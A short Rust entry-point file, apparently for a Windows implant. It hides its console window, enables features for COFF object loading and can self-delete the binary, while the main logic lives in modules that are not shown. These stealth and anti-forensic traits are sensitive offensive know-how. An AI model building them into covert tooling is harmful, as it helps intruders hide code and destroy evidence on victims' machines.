// Hide the console window
#![windows_subsystem = "windows"]
// Enable features for COFF loading
#![allow(internal_features)]
#![feature(c_variadic)]
#![feature(core_intrinsics)]

mod app;

use app::debug::{allocate_console_debug_only, debug_println};

fn main() {
    // Allocate a console if we're in debug mode
    allocate_console_debug_only();

    // Self-delete the binary if the feature is enabled
    #[cfg(feature = "selfdelete")]
    if let Err(_e) = crate::app::self_delete::perform() {
        debug_println!("Failed to self-delete: {:?}", _e);
    };

    app::main();
}
